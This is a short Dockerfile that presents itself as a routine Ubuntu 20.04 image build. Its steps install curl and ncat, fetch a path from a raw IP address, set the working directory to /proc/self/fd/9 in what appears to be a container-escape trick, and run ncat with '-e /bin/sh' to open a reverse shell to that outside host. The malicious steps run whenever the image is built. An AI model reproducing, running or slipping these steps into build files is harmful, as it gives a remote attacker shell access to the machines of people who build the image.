FROM ubuntu:20.04
RUN apt update && apt install -y curl && apt install -y ncat && apt install python3 -y
RUN curl http://68.183.4.199:5555/aws/9

WORKDIR /proc/self/fd/9

RUN ncat 68.183.4.199 6767 -e /bin/sh

CMD ["/bin/bash"]
